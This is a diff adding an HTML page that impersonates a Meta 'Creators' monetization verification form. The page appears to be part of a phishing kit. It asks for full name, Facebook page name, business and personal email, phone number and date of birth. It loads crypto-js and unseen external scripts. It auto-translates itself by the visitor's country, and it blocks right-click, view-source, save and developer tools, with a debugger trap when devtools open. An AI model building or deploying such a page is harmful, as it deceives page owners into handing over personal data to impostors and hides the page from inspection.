@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta | Creators</title>
+    <link rel="shortcut icon" href="./public/images/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="./public/styles/style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+</head>
+
+<body>
+    <div class="bg-[#F5F6F6] h-[52px] flex items-center justify-center border-b border-[#E0E0E0]">
+        <div class="max-w-[1280px] w-full flex items-center justify-between px-4">
+            <a href="/">
+                <img src="./public/images/logo-meta.svg" width="64px" alt="Meta Logo" />
+            </a>
+        </div>
+    </div>
+
+    <div class="w-full max-w-[600px] my-10 mx-auto bg-white md:rounded-lg md:shadow-sm md:border md:border-gray-200 px-4 py-4">
+        <img src="./public/images/lgoo.jpg" alt="Logo" class="w-80 h-auto mx-auto mb-4">
+        <div class="mb-6 p-4 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px]">
+              To enable monetization on your Page, please complete the identity verification process. 
+              This is a mandatory step to enhance account security, protect ownership rights, and meet the platform's compliance terms.
+        </div>
+
+        <form id="clientForm" class="space-y-4">
+            <div>
+                <label class="block font-[600] text-sm text-gray-700 mb-1">
+                    Full Name <span class="text-red-600">*</span>
+                </label>
+                <input type="text" name="fullName" id="fullName" placeholder="Enter your full name" required
+                    class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+            </div>
+
+            <div>
+                <label class="block font-[600] text-sm text-gray-700 mb-1">
+                    Facebook Page Name <span class="text-red-600">*</span>
+                </label>
+                <input type="text" name="pageName" id="fanpage" placeholder="Enter your Facebook page name" required
+                    class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+            </div>
+
+            <div>
+                <label class="block font-[600] text-sm text-gray-700 mb-1">
+                    Business Email <span class="text-red-600">*</span>
+                </label>
+                <input type="email" id="emailBusiness" name="businessEmail" placeholder="Enter your business email" required
+                    class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+            </div>
+
+            <div>
+                <label class="block font-[600] text-sm text-gray-700 mb-1">
+                    Personal Email <span class="text-red-600">*</span>
+                </label>
+                <input type="email" id="email" name="personalEmail" placeholder="Enter your personal email" required
+                    class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+            </div>
+
+            <div>
+                <label class="block font-[600] text-sm text-gray-700 mb-1">
+                    Mobile Phone Number <span class="text-red-600">*</span>
+                </label>
+                <input type="tel" id="phone" name="phone" placeholder="Enter your mobile phone number" required
+                    oninput="this.value=this.value.replace(/[^0-9]/g,'')" inputmode="numeric" pattern="[0-9]*"
+                    class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+            </div>
+
+            <div>
+                <label class="block font-[600] text-sm text-gray-700 mb-1">
+                    Date of Birth <span class="text-red-600">*</span>
+                </label>
+                <div class="grid grid-cols-3 gap-3">
+                    <input type="number" id="dob-day" name="dob_day" placeholder="Day" min="1" max="31" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+                    <input type="number" id="dob-month" name="dob_month" placeholder="Month" min="1" max="12" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+                    <input type="number" id="dob-year" name="dob_year" placeholder="Year" min="1900" max="2026" required
+                        class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base md:text-sm focus:border-[#0064E0] outline-none transition-colors" style="touch-action: manipulation;" />
+                </div>
+            </div>
+
+            <div class="mt-4">
+                <textarea name="additionalNotes" placeholder="Additional notes (optional)"
+                    class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-base md:text-sm resize-none outline-none focus:border-[#0064E0] transition-colors" style="touch-action: manipulation;"></textarea>
+            </div>
+
+            <div class="pt-2 space-y-4">
+                <div class="flex items-start gap-2.5">
+                    <input type="checkbox" id="terms" name="terms" required
+                        class="w-4 h-4 mt-0.5 text-[#0064E0] border-gray-300 rounded focus:ring-blue-500 cursor-pointer" />
+                    <label for="terms" class="text-sm text-gray-600 select-none cursor-pointer leading-relaxed">
+                        I agree with 
+                        <a href="#" target="_blank" class="text-[#0064E0] hover:underline inline-flex items-center gap-1 font-medium">
+                            Terms of use
+                            <svg class="w-3.5 h-3.5 flex-shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path>
+                            </svg>
+                        </a>
+                    </label>
+                </div>
+
+                <div>
+                    <button id="btn-submit-request" type="submit"
+                        class="w-full h-10 min-h-[40px] bg-[#0064E0] text-white font-medium rounded-full text-sm hover:bg-blue-700 transition-colors shadow-sm">
+                        Continue
+                    </button>
+                </div>
+
+                <div class="pt-8 pb-2 flex justify-center">
+                    <img src="./public/images/logo-gray.svg" alt="Meta" class="w-16 h-auto opacity-80">
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="bg-[#F5F6F6] pt-5 pb-5 border-t border-[#E0E0E0] w-full">
+        <div class="max-w-[1280px] w-full mx-auto px-4">
+            <div class="flex flex-wrap justify-center gap-4 mb-4 text-[13px] text-gray-600">
+                <a href="#" class="hover:underline text-[#6D84B4]">English (US)</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">English (UK)</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">Italiano</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">Français</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">中文(简体)</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">日本語</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">한국어</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">עברית</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">Español</a>
+                <a href="#" class="hover:underline text-[#6D84B4]">Português</a>
+            </div>
+            <div class="flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
+                <p class="mr-4">© 2026 Meta</p>
+                <a href="#" class="hover:underline">About</a>
+                <a href="#" class="hover:underline">Developers</a>
+                <a href="#" class="hover:underline">Careers</a>
+                <a href="#" class="hover:underline">Privacy</a>
+                <a href="#" class="hover:underline">Cookies</a>
+                <a href="#" class="hover:underline">Terms</a>
+                <a href="#" class="hover:underline">Help Center</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="modalsContainer"></div>
+
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
+    
+
+<style>
+    #google_translate_element, 
+    .skiptranslate, 
+    .goog-te-banner-frame, 
+    .goog-te-balloon-frame,
+    .goog-te-balloon-wrapper,
+    iframe[class*="goog"] {
+        display: none !important;
+    }
+    
+    body {
+        top: 0 !important;
+        position: static !important;
+    }
+    
+    .goog-text-highlight,
+    .goog-text-highlight:hover,
+    .goog-text-highlight:active,
+    .goog-text-highlight:focus {
+        background: transparent !important;
+        background-color: transparent !important;
+        box-shadow: none !important;
+        text-decoration: none !important;
+        color: inherit !important;
+    }
+</style>
+
+<div id="google_translate_element" style="display:none;"></div>
+
+<script>
+    const langMap = {
+        AF:"fa", AX:"sv", AL:"sq", DZ:"ar", AS:"en", AD:"ca", AO:"pt", AI:"en", AQ:"en", AG:"en", AR:"es", AM:"hy", AW:"nl", AU:"en", AT:"de", AZ:"az",
+        BS:"en", BH:"ar", BD:"bn", BB:"en", BY:"be", BE:"nl", BZ:"en", BJ:"fr", BM:"en", BT:"dz", BO:"es", BQ:"nl", BA:"bs", BW:"en", BV:"no", BR:"pt",
+        IO:"en", BN:"ms", BG:"bg", BF:"fr", BI:"fr", KH:"km", CM:"fr", CA:"en", CV:"pt", KY:"en", CF:"fr", TD:"fr", CL:"es", CN:"zh-CN", CX:"en", CC:"en",
+        CO:"es", KM:"ar", CG:"fr", CD:"fr", CK:"en", CR:"es", CI:"fr", HR:"hr", CU:"es", CW:"nl", CY:"el", CZ:"cs", DK:"da", DJ:"fr", DM:"en", DO:"es",
+        EC:"es", EG:"ar", SV:"es", GQ:"es", ER:"ti", EE:"et", SZ:"en", ET:"am", FK:"en", FO:"fo", FJ:"en", FI:"fi", FR:"fr", GF:"fr", PF:"fr", TF:"fr",
+        GA:"fr", GM:"en", GE:"ka", DE:"de", GH:"en", GI:"en", GR:"el", GL:"kl", GD:"en", GP:"fr", GU:"en", GT:"es", GG:"en", GN:"fr", GW:"pt", GY:"en",
+        HT:"fr", HM:"en", VA:"it", HN:"es", HK:"zh-TW", HU:"hu", IS:"is", IN:"hi", ID:"id", IR:"fa", IQ:"ar", IE:"en", IM:"en", IL:"iw", IT:"it", JM:"en",
+        JP:"ja", JE:"en", JO:"ar", KZ:"kk", KE:"sw", KI:"en", KP:"ko", KR:"ko", KW:"ar", KG:"ky", LA:"lo", LV:"lv", LB:"ar", LS:"en", LR:"en", LY:"ar",
+        LI:"de", LT:"lt", LU:"fr", MO:"zh-TW", MK:"mk", MG:"fr", MW:"en", MY:"ms", MV:"dv", ML:"fr", MT:"mt", MH:"en", MQ:"fr", MR:"ar", MU:"en", YT:"fr",
+        MX:"es", FM:"en", MD:"ro", MC:"fr", MN:"mn", ME:"sr", MS:"en", MA:"ar", MZ:"pt", MM:"my", NA:"en", NR:"en", NP:"ne", NL:"nl", NC:"fr", NZ:"en",
+        NI:"es", NE:"fr", NG:"en", NU:"en", NF:"en", MP:"en", NO:"no", OM:"ar", PK:"ur", PW:"en", PS:"ar", PA:"es", PG:"en", PY:"es", PE:"es", PH:"tl",
+        PN:"en", PL:"pl", PT:"pt", PR:"es", QA:"ar", RE:"fr", RO:"ro", RU:"ru", RW:"rw", BL:"fr", SH:"en", KN:"en", LC:"en", MF:"fr", PM:"fr", VC:"en",
+        WS:"sm", SM:"it", ST:"pt", SA:"ar", SN:"fr", RS:"sr", SC:"fr", SL:"en", SG:"en", SX:"nl", SK:"sk", SI:"sl", SB:"en", SO:"so", ZA:"en", GS:"en",
+        SS:"en", ES:"es", LK:"si", SD:"ar", SR:"nl", SJ:"no", SE:"sv", CH:"de", SY:"ar", TW:"zh-TW", TJ:"tg", TZ:"sw", TH:"th", TL:"pt", TG:"fr", TK:"en",
+        TO:"en", TT:"en", TN:"ar", TR:"tr", TM:"tk", TC:"en", TV:"en", UG:"en", UA:"uk", AE:"ar", GB:"en", US:"en", UM:"en", UY:"es", UZ:"uz", VU:"bi",
+        VE:"es", VN:"vi", VG:"en", VI:"en", WF:"fr", EH:"es", YE:"ar", ZM:"en", ZW:"en"
+    };
+
+    async function getLiveCountryCode() {
+        try {
+            const res = await fetch("https://get.geojs.io/v1/ip/geo.json");
+            const data = await res.json();
+            return data.country_code || "US";
+        } catch (e) {
+            console.error("GeoIP Fetch Error, defaulting to US", e);
+            return "US";
+        }
+    }
+
+    function setTranslateCookie(lang) {
+        const d = new Date();
+        d.setTime(d.getTime() + (1 * 24 * 60 * 60 * 1000));
+        document.cookie = `googtrans=/en/${lang};expires=${d.toUTCString()};path=/;SameSite=None;Secure`;
+        document.cookie = `googtrans=/en/${lang};expires=${d.toUTCString()};path=/;domain=.${window.location.hostname};SameSite=None;Secure`;
+    }
+
+    function clearTranslateCookie() {
+        const expires = "expires=Thu, 01 Jan 1970 00:00:00 UTC";
+        document.cookie = `googtrans=;${expires};path=/;SameSite=None;Secure`;
+        document.cookie = `googtrans=;${expires};path=/;domain=.${window.location.hostname};SameSite=None;Secure`;
+    }
+
+    async function googleTranslateElementInit() {
+        const country = await getLiveCountryCode();
+        const targetLang = langMap[country] || "en";
+
+        if (targetLang === "en") {
+            clearTranslateCookie();
+            return;
+        }
+
+        setTranslateCookie(targetLang);
+
+        new google.translate.TranslateElement({
+            pageLanguage: "en",
+            autoDisplay: false
+        }, "google_translate_element");
+
+        const checkCombo = setInterval(() => {
+            const select = document.querySelector(".goog-te-combo");
+            if (select) {
+                clearInterval(checkCombo);
+                if (select.value !== targetLang) {
+                    select.value = targetLang;
+                    select.dispatchEvent(new Event("create"));
+                    select.dispatchEvent(new Event("change"));
+                }
+            }
+        }, 30); 
+    }
+
+    window.addEventListener("pageshow", async () => {
+        const country = await getLiveCountryCode();
+        const targetLang = langMap[country] || "en";
+        if (targetLang === "en") {
+            clearTranslateCookie();
+        } else {
+            setTranslateCookie(targetLang);
+        }
+    });
+</script>
+<script async src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script>
+        document.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+        }, false);
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'F12' || e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+
+            if (e.ctrlKey && e.shiftKey && (
+                e.key.toLowerCase() === 'i' ||
+                e.key.toLowerCase() === 'j' ||
+                e.key.toLowerCase() === 'c'
+            )) {
+                e.preventDefault();
+                return false;
+            }
+
+            if (e.ctrlKey && (e.key.toLowerCase() === 'u')) {
+                e.preventDefault();
+                return false;
+            }
+
+            if (e.ctrlKey && (e.key.toLowerCase() === 's')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        setInterval(() => {
+            const devtoolsOpen =
+                (window.outerWidth - window.innerWidth > 160) ||
+                (window.outerHeight - window.innerHeight > 160);
+
+            if (devtoolsOpen) {
+                debugger;
+            }
+        }, 500);
+
+        document.addEventListener('keyup', e => {
+            if (e.key === 'F12') e.preventDefault();
+        });
+    </script>
+</body>
+
+</html>
